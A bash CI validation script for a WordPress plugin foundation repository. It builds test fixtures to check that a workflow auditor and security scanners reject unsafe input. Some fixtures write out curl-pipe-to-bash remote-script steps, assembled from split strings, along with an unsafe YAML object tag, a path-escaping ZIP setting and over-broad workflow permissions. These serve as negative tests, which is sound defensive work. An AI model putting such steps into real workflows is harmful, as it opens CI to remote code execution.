#!/usr/bin/env bash

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(cd "$SCRIPT_DIR/../.." && pwd)"
# shellcheck source=../lib/require_tools.sh
. "$SCRIPT_DIR/../lib/require_tools.sh"

wp_plugin_base_require_commands "foundation validation" git php node ruby perl rsync zip unzip jq
audit_fixture=""
zip_fixture=""
forbidden_fixture=""
managed_security_child=""
authorization_fixture=""
deploy_protection_fixture=""
deploy_local_project_fixture=""
plugin_check_release_fixture=""
plugin_check_resolve_output=""
foundation_release_fixture=""
foundation_resolve_output=""
pr_stage_fixture=""
pr_stage_origin=""
pr_stage_output=""

while IFS= read -r file; do
  bash -n "$file"
done < <(find "$ROOT_DIR/scripts" -name '*.sh' -print | sort)

bash "$ROOT_DIR/scripts/ci/lint_shell.sh"
bash "$ROOT_DIR/scripts/ci/lint_workflows.sh"
bash "$ROOT_DIR/scripts/ci/lint_yaml.sh"
bash "$ROOT_DIR/scripts/ci/lint_markdown.sh"
bash "$ROOT_DIR/scripts/ci/lint_spelling.sh"
bash "$ROOT_DIR/scripts/ci/check_editorconfig.sh"
bash "$ROOT_DIR/scripts/ci/scan_secrets.sh"
bash "$ROOT_DIR/scripts/ci/check_forbidden_files.sh"
bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$ROOT_DIR"
bash "$ROOT_DIR/scripts/foundation/check_wordpress_env_tooling.sh"

for workflow_dir in \
  "$ROOT_DIR/.github/workflows" \
  "$ROOT_DIR/templates/child/.github/workflows"
do
  if find "$workflow_dir" -type f -name '*.yaml' | grep -q .; then
    echo "Workflow YAML files must use the .yml extension: $workflow_dir" >&2
    find "$workflow_dir" -type f -name '*.yaml' >&2
    exit 1
  fi
done

if grep -Fq 'pull/[0-9]+/merge' "$ROOT_DIR/scripts/release/verify_sigstore_bundle.sh"; then
  echo "Strict Sigstore verifier must not trust pull-request merge refs." >&2
  exit 1
fi

bash "$ROOT_DIR/scripts/foundation/check_version.sh"
bash "$ROOT_DIR/scripts/foundation/check_release_branch.sh" "release/$(tr -d '\n' < "$ROOT_DIR/VERSION")"

for fixture_name in standard-plugin nonstandard-plugin; do
  source_fixture="$ROOT_DIR/tests/fixtures/$fixture_name"
  fixture="$(mktemp -d)"
  branch_name="release/1.2.3"

  if [ "$fixture_name" = "nonstandard-plugin" ]; then
    branch_name="release/2.4.6"
  fi

  mkdir -p "$fixture/.wp-plugin-base"
  cp -R "$source_fixture/." "$fixture/"
  rsync -a --exclude '.git' "$ROOT_DIR/" "$fixture/.wp-plugin-base/"
  WP_PLUGIN_BASE_ROOT="$fixture" bash "$ROOT_DIR/scripts/update/sync_child_repo.sh"
  WP_PLUGIN_BASE_ROOT="$fixture" bash "$ROOT_DIR/scripts/ci/validate_project.sh" "" "$branch_name"
  WP_PLUGIN_BASE_ROOT="$fixture" bash "$ROOT_DIR/scripts/release/generate_github_release_body.sh" "${branch_name#release/}" > "$fixture/dist/release-body.md"
  rm -rf "$fixture/dist" "$fixture"
done

managed_child="$(mktemp -d)"
trap 'rm -rf "$managed_child" "$managed_security_child" "$audit_fixture" "$zip_fixture" "$forbidden_fixture" "$authorization_fixture" "$deploy_protection_fixture" "$deploy_local_project_fixture" "$plugin_check_release_fixture" "$plugin_check_resolve_output" "$foundation_release_fixture" "$foundation_resolve_output" "$pr_stage_fixture" "$pr_stage_origin" "$pr_stage_output"' EXIT
mkdir -p "$managed_child/.wp-plugin-base"
cp -R "$ROOT_DIR/tests/fixtures/standard-plugin/." "$managed_child/"
rsync -a --exclude '.git' "$ROOT_DIR/" "$managed_child/.wp-plugin-base/"
WP_PLUGIN_BASE_ROOT="$managed_child" bash "$managed_child/.wp-plugin-base/scripts/update/sync_child_repo.sh"
test -f "$managed_child/.github/workflows/ci.yml"
test -f "$managed_child/.github/workflows/prepare-release.yml"
test -f "$managed_child/.github/workflows/finalize-release.yml"
test -f "$managed_child/.github/workflows/release.yml"
test -f "$managed_child/.github/workflows/update-foundation.yml"
test -f "$managed_child/.github/dependabot.yml"
test -f "$managed_child/CONTRIBUTING.md"
test -f "$managed_child/.editorconfig"
test -f "$managed_child/.gitattributes"
test -f "$managed_child/.gitignore"
test -f "$managed_child/.wp-plugin-base-security-suppressions.json"
test -f "$managed_child/CHANGELOG.md"
test -f "$managed_child/SECURITY.md"
test -f "$managed_child/uninstall.php.example"
grep -Fq '/.wp-plugin-base-security-pack export-ignore' "$managed_child/.gitattributes"
grep -Fq '/.phpcs-security.xml.dist export-ignore' "$managed_child/.gitattributes"
grep -Fq 'secret-scan:' "$managed_child/.github/workflows/ci.yml"
test ! -f "$managed_child/.github/CODEOWNERS"
if find "$managed_child/.github/workflows" -type f -name '*.yaml' | grep -q .; then
  echo "Managed child workflows must use .yml, not .yaml." >&2
  find "$managed_child/.github/workflows" -type f -name '*.yaml' >&2
  exit 1
fi

cat > "$managed_child/.wp-plugin-base-security-suppressions.json" <<'EOF'
{
  "suppressions": [
    {
      "kind": "wp_ajax_nopriv",
      "identifier": "preserve_on_sync",
      "path": "includes/public-endpoints.php",
      "justification": "Fixture suppression to ensure sync preserves project-owned suppressions."
    }
  ]
}
EOF
WP_PLUGIN_BASE_ROOT="$managed_child" bash "$managed_child/.wp-plugin-base/scripts/update/sync_child_repo.sh"
grep -Fq 'preserve_on_sync' "$managed_child/.wp-plugin-base-security-suppressions.json"

managed_security_child="$(mktemp -d)"
cp -R "$ROOT_DIR/tests/fixtures/quality-ready/." "$managed_security_child/"
mkdir -p "$managed_security_child/.wp-plugin-base"
rsync -a --exclude '.git' "$ROOT_DIR/" "$managed_security_child/.wp-plugin-base/"
WP_PLUGIN_BASE_ROOT="$managed_security_child" bash "$managed_security_child/.wp-plugin-base/scripts/update/sync_child_repo.sh"
test -f "$managed_security_child/.phpcs-security.xml.dist"
test -f "$managed_security_child/.wp-plugin-base-security-pack/composer.json"
test -f "$managed_security_child/.wp-plugin-base-security-pack/composer.lock"
test -f "$managed_security_child/.github/workflows/woocommerce-qit.yml"
if grep -Fq 'qit_cli_constraint' "$managed_security_child/.github/workflows/woocommerce-qit.yml"; then
  echo "Managed WooCommerce QIT workflow unexpectedly exposes qit_cli_constraint input." >&2
  exit 1
fi
grep -Fq 'Run Semgrep security scan' "$managed_security_child/.github/workflows/ci.yml"
grep -Fq "if: \${{ always() && needs.validate.outputs.wordpress_security_pack_enabled == 'true' }}" "$managed_security_child/.github/workflows/ci.yml"
grep -Fq "WP_PLUGIN_BASE_SECURITY_PACK_SKIP_SEMGREP: 'true'" "$managed_security_child/.github/workflows/ci.yml"
grep -Fq 'php-runtime-smoke:' "$managed_security_child/.github/workflows/ci.yml"
grep -Fq '/plugin-check/cli.php' "$ROOT_DIR/scripts/ci/run_plugin_check.sh"
grep -Fq -- '--require="$plugin_check_cli_bootstrap"' "$ROOT_DIR/scripts/ci/run_plugin_check.sh"
grep -Fq 'resolve_latest_plugin_check_version.sh' "$ROOT_DIR/.github/workflows/update-plugin-check.yml"
grep -Fq 'resolve_latest_foundation_version.sh' "$ROOT_DIR/.github/workflows/update-foundation.yml"
grep -Fq 'GIT_ADD_PATHS: scripts/lib/wordpress_tooling.sh' "$ROOT_DIR/.github/workflows/update-plugin-check.yml"
grep -Fq 'publish_github_release.sh --repair' "$ROOT_DIR/.github/workflows/release-foundation.yml"

plugin_check_release_fixture="$(mktemp)"
cat > "$plugin_check_release_fixture" <<'EOF'
[
  {
    "tag_name": "1.9.0",
    "draft": false,
    "prerelease": false
  },
  {
    "tag_name": "1.9.1",
    "draft": true,
    "prerelease": false
  },
  {
    "tag_name": "1.10.0",
    "draft": false,
    "prerelease": false
  },
  {
    "tag_name": "2.0.0",
    "draft": false,
    "prerelease": false
  }
]
EOF

plugin_check_resolve_output="$(mktemp)"
WP_PLUGIN_BASE_PLUGIN_CHECK_RELEASES_JSON="$plugin_check_release_fixture" bash "$ROOT_DIR/scripts/update/resolve_latest_plugin_check_version.sh" "1.9.0" "WordPress/plugin-check" "$plugin_check_resolve_output"
grep -Fxq 'update_needed=true' "$plugin_check_resolve_output"
grep -Fxq 'version=1.10.0' "$plugin_check_resolve_output"

plugin_check_resolve_output="$(mktemp)"
WP_PLUGIN_BASE_PLUGIN_CHECK_RELEASES_JSON="$plugin_check_release_fixture" bash "$ROOT_DIR/scripts/update/resolve_latest_plugin_check_version.sh" "1.10.0" "WordPress/plugin-check" "$plugin_check_resolve_output"
grep -Fxq 'update_needed=false' "$plugin_check_resolve_output"
grep -Fxq 'version=' "$plugin_check_resolve_output"

foundation_release_fixture="$(mktemp)"
cat > "$foundation_release_fixture" <<'EOF'
[
  {
    "tag_name": "v1.2.2",
    "draft": false,
    "prerelease": false
  },
  {
    "tag_name": "v1.2.3",
    "draft": true,
    "prerelease": false
  },
  {
    "tag_name": "v1.2.4",
    "draft": false,
    "prerelease": false
  },
  {
    "tag_name": "v2.0.0",
    "draft": false,
    "prerelease": false
  }
]
EOF

foundation_resolve_output="$(mktemp)"
WP_PLUGIN_BASE_FOUNDATION_RELEASES_JSON="$foundation_release_fixture" bash "$ROOT_DIR/scripts/update/resolve_latest_foundation_version.sh" "v1.2.2" "MatthiasReinholz/wp-plugin-base" "$foundation_resolve_output"
grep -Fxq 'update_needed=true' "$foundation_resolve_output"
grep -Fxq 'version=v1.2.4' "$foundation_resolve_output"

foundation_resolve_output="$(mktemp)"
WP_PLUGIN_BASE_FOUNDATION_RELEASES_JSON="$foundation_release_fixture" bash "$ROOT_DIR/scripts/update/resolve_latest_foundation_version.sh" "v1.2.4" "MatthiasReinholz/wp-plugin-base" "$foundation_resolve_output"
grep -Fxq 'update_needed=false' "$foundation_resolve_output"
grep -Fxq 'version=' "$foundation_resolve_output"

audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for an unpinned action." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: softprops/action-gh-release@153bb8e04406b158c6c84fc1615b65b24149a1fe
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a disallowed action." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

remote_script_scheme='https'
remote_script_separator='://'
remote_script_target='example.com/install.sh'
remote_script_prefix="      - run: curl -fsSL ${remote_script_scheme}${remote_script_separator}${remote_script_target} | "
remote_script_shell='bash'
cat > "$audit_fixture/.github/workflows/ci.yml" <<EOF
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
${remote_script_prefix}${remote_script_shell}
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a remote script pipe-to-shell payload." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: write-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for broad permissions." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/custom.yml" <<'EOF'
name: custom
on: workflow_dispatch
permissions:
  contents: read
jobs:
  escalate:
    permissions:
      contents: write
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a custom workflow permission escalation." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    permissions:
      contents: write
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for job-level permission escalation." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/release.yml" <<'EOF'
name: release
on:
  pull_request_target:
    types:
      - closed
permissions:
  contents: write
  pull-requests: read
  attestations: write
  id-token: write
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for an ungated pull_request_target workflow." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/finalize-release.yml" <<'EOF'
name: finalize-release
on:
  pull_request_target:
    types:
      - closed
permissions:
  contents: write
  attestations: write
  id-token: write
jobs:
  release:
    if: >
      always() || (
        github.event.pull_request.merged == true &&
        github.event.pull_request.base.ref == 'main' &&
        github.event.pull_request.head.repo.full_name == github.repository &&
        (startsWith(github.event.pull_request.head.ref, 'release/') || startsWith(github.event.pull_request.head.ref, 'hotfix/'))
      )
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a broadened pull_request_target condition." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: !ruby/object:OpenStruct
  table:
    workflow_dispatch: true
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for unsafe YAML content." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"
mkdir -p "$audit_fixture/.github/actions/test-action"
composite_remote_script_scheme='https'
composite_remote_script_separator='://'
composite_remote_script_target='example.com/install.sh'
composite_remote_script_shell='ba''sh'
composite_remote_script_command="cur""l -fsSL ${composite_remote_script_scheme}${composite_remote_script_separator}${composite_remote_script_target} | ${composite_remote_script_shell}"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: ./.github/actions/test-action
EOF

cat > "$audit_fixture/.github/actions/test-action/action.yml" <<EOF
name: test-action
runs:
  using: composite
  steps:
    - shell: bash
      run: ${composite_remote_script_command}
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a composite action remote script payload." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/custom.yml" <<'EOF'
name: custom
on: workflow_dispatch
permissions:
  contents: read
jobs:
  lint:
    permissions:
      contents: read
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if ! bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly failed for a valid custom workflow." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"
extra_url_scheme='https'
extra_url_separator='://'
extra_url_host='raw.githubusercontent.com'
extra_url_path='example/repo/main/file.txt'
extra_url="${extra_url_scheme}${extra_url_separator}${extra_url_host}/${extra_url_path}"

cat > "$audit_fixture/.github/workflows/ci.yml" <<EOF
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
      - run: echo "$extra_url"
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a non-allowlisted host." >&2
  exit 1
fi

if ! EXTRA_ALLOWED_HOSTS='raw.githubusercontent.com' bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly failed when EXTRA_ALLOWED_HOSTS included the host." >&2
  exit 1
fi

authorization_fixture="$(mktemp -d)"
mkdir -p "$authorization_fixture/includes"
cat > "$authorization_fixture/.wp-plugin-base.env" <<'EOF'
WORDPRESS_SECURITY_PACK_ENABLED=true
EOF

cat > "$authorization_fixture/includes/public-endpoints.php" <<'EOF'
<?php
add_action( 'wp_ajax_nopriv_my_public_action', 'my_public_handler' );
EOF

if WP_PLUGIN_BASE_ROOT="$authorization_fixture" bash "$ROOT_DIR/scripts/ci/scan_wordpress_authorization_patterns.sh" >/dev/null 2>&1; then
  echo "Authorization scan unexpectedly passed without a suppression." >&2
  exit 1
fi

cat > "$authorization_fixture/.wp-plugin-base-security-suppressions.json" <<'EOF'
{
  "suppressions": [
    {
      "kind": "wp_ajax_public",
      "identifier": "my_public_action",
      "path": "includes/public-endpoints.php",
      "justification": "Intentional public endpoint."
    }
  ]
}
EOF

if WP_PLUGIN_BASE_ROOT="$authorization_fixture" bash "$ROOT_DIR/scripts/ci/scan_wordpress_authorization_patterns.sh" >/dev/null 2>&1; then
  echo "Authorization scan unexpectedly accepted an invalid suppression kind." >&2
  exit 1
fi

cat > "$authorization_fixture/.wp-plugin-base-security-suppressions.json" <<'EOF'
{
  "suppressions": [
    {
      "kind": "wp_ajax_nopriv",
      "identifier": "my_public_action",
      "path": "includes/public-endpoints.php",
      "justification": ""
    }
  ]
}
EOF

if WP_PLUGIN_BASE_ROOT="$authorization_fixture" bash "$ROOT_DIR/scripts/ci/scan_wordpress_authorization_patterns.sh" >/dev/null 2>&1; then
  echo "Authorization scan unexpectedly passed with an empty suppression justification." >&2
  exit 1
fi

cat > "$authorization_fixture/.wp-plugin-base-security-suppressions.json" <<'EOF'
{
  "suppressions": [
    {
      "kind": "wp_ajax_nopriv",
      "identifier": "my_public_action",
      "path": "includes/public-endpoints.php",
      "justification": "Public endpoint is required for unauthenticated preflight and only returns nonce-gated non-sensitive metadata."
    }
  ]
}
EOF

if ! WP_PLUGIN_BASE_ROOT="$authorization_fixture" bash "$ROOT_DIR/scripts/ci/scan_wordpress_authorization_patterns.sh" >/dev/null 2>&1; then
  echo "Authorization scan unexpectedly failed with a justified suppression." >&2
  exit 1
fi

deploy_protection_fixture="$(mktemp -d)"
cat > "$deploy_protection_fixture/.wp-plugin-base.env" <<'EOF'
WP_ORG_DEPLOY_ENABLED=true
PRODUCTION_ENVIRONMENT=production
EOF

if ! WP_PLUGIN_BASE_ROOT="$deploy_protection_fixture" bash "$ROOT_DIR/scripts/ci/check_deploy_environment_protection.sh" >/dev/null 2>&1; then
  echo "Deploy environment protection check unexpectedly failed in non-strict mode." >&2
  exit 1
fi

if WP_PLUGIN_BASE_ROOT="$deploy_protection_fixture" bash "$ROOT_DIR/scripts/ci/check_deploy_environment_protection.sh" --strict >/dev/null 2>&1; then
  echo "Deploy environment protection check unexpectedly passed in strict mode without GitHub environment context." >&2
  exit 1
fi

deploy_local_project_fixture="$(mktemp -d)"
cp -R "$ROOT_DIR/tests/fixtures/standard-plugin/." "$deploy_local_project_fixture/"
mkdir -p "$deploy_local_project_fixture/.wp-plugin-base"
rsync -a --exclude '.git' "$ROOT_DIR/" "$deploy_local_project_fixture/.wp-plugin-base/"
WP_PLUGIN_BASE_ROOT="$deploy_local_project_fixture" bash "$ROOT_DIR/scripts/update/sync_child_repo.sh"
if ! WP_ORG_DEPLOY_ENABLED=true WP_PLUGIN_BASE_ROOT="$deploy_local_project_fixture" bash "$ROOT_DIR/scripts/ci/validate_project.sh" "" "release/1.2.3" >/dev/null 2>&1; then
  echo "Project validation unexpectedly failed locally for a deploy-enabled project." >&2
  exit 1
fi

zip_fixture="$(mktemp -d)"
cp -R "$ROOT_DIR/tests/fixtures/standard-plugin/." "$zip_fixture/"
mkdir -p "$zip_fixture/.wp-plugin-base"
rsync -a --exclude '.git' "$ROOT_DIR/" "$zip_fixture/.wp-plugin-base/"
perl -0pi -e 's/^ZIP_FILE=.*/ZIP_FILE=..\/outside.zip/m' "$zip_fixture/.wp-plugin-base.env"

if WP_PLUGIN_BASE_ROOT="$zip_fixture" bash "$ROOT_DIR/scripts/ci/validate_config.sh" >/dev/null 2>&1; then
  echo "Config validation unexpectedly accepted an escaping ZIP_FILE." >&2
  exit 1
fi

rm -rf "$zip_fixture"

pr_stage_fixture="$(mktemp -d)"
pr_stage_origin="$(mktemp -d)"
git init --bare -q "$pr_stage_origin"
git -C "$pr_stage_fixture" init -q
git -C "$pr_stage_fixture" config user.email "fixture@example.com"
git -C "$pr_stage_fixture" config user.name "Fixture"
mkdir -p "$pr_stage_fixture/.wp-plugin-base-security-pack"
cat > "$pr_stage_fixture/.wp-plugin-base-security-pack/composer.json" <<'EOF'
{"name":"fixture/security-pack"}
EOF
git -C "$pr_stage_fixture" add .wp-plugin-base-security-pack/composer.json
git -C "$pr_stage_fixture" commit -qm "init"
git -C "$pr_stage_fixture" branch -M main
git -C "$pr_stage_fixture" remote add origin "$pr_stage_origin"
git -C "$pr_stage_fixture" push -q -u origin main
rm -rf "$pr_stage_fixture/.wp-plugin-base-security-pack"
cat > "$pr_stage_fixture/body.md" <<'EOF'
fixture body
EOF
mkdir -p "$pr_stage_fixture/bin"
cat > "$pr_stage_fixture/bin/gh" <<'EOF'
#!/usr/bin/env bash
if [ "$1" = "pr" ] && [ "$2" = "list" ]; then
  echo '[]'
  exit 0
fi
if [ "$1" = "pr" ] && [ "$2" = "create" ]; then
  echo 'https://github.com/example/repo/pull/1'
  exit 0
fi
echo "Unexpected gh invocation: $*" >&2
exit 1
EOF
chmod +x "$pr_stage_fixture/bin/gh"
pr_stage_output="$(mktemp)"
(
  cd "$pr_stage_fixture"
  PATH="$pr_stage_fixture/bin:$PATH" \
    GITHUB_REPOSITORY="example/repo" \
    GITHUB_REPOSITORY_OWNER="example" \
    GITHUB_OUTPUT="$pr_stage_output" \
    GIT_ADD_PATHS=".wp-plugin-base-security-pack" \
    bash "$ROOT_DIR/scripts/update/create_or_update_pr.sh" \
      "chore/fixture-removal" \
      "main" \
      "fixture removal" \
      "fixture removal" \
      "$pr_stage_fixture/body.md"
)
if git -C "$pr_stage_fixture" ls-tree -r --name-only HEAD | grep -Fq '.wp-plugin-base-security-pack/composer.json'; then
  echo "Explicit path staging unexpectedly failed to commit a managed deletion." >&2
  exit 1
fi

forbidden_fixture="$(mktemp -d)"
trap 'rm -rf "$managed_child" "$managed_security_child" "$audit_fixture" "$zip_fixture" "$forbidden_fixture" "$authorization_fixture" "$deploy_protection_fixture" "$deploy_local_project_fixture" "$plugin_check_release_fixture" "$plugin_check_resolve_output" "$foundation_release_fixture" "$foundation_resolve_output" "$pr_stage_fixture" "$pr_stage_origin" "$pr_stage_output"' EXIT
cp -R "$ROOT_DIR/tests/fixtures/standard-plugin/." "$forbidden_fixture/"
mkdir -p "$forbidden_fixture/.wp-plugin-base"
rsync -a --exclude '.git' "$ROOT_DIR/" "$forbidden_fixture/.wp-plugin-base/"
touch "$forbidden_fixture/.DS_Store"
if WP_PLUGIN_BASE_ROOT="$forbidden_fixture" bash "$ROOT_DIR/scripts/ci/check_forbidden_files.sh" >/dev/null 2>&1; then
  echo "Forbidden file policy unexpectedly accepted .DS_Store." >&2
  exit 1
fi

echo "Validated foundation repository at $ROOT_DIR"
